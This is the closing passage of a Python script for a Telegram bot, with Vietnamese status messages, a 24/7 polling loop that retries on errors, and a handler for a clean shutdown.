⏱ Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
""")
    except:
        pass
    
    print("[*] Bot đang chạy 24/7...")
    
    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=60)
        except Exception as e:
            print(f"[!] Lỗi: {e}")
            time.sleep(5)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Bot dừng!")
        sys.exit(0)
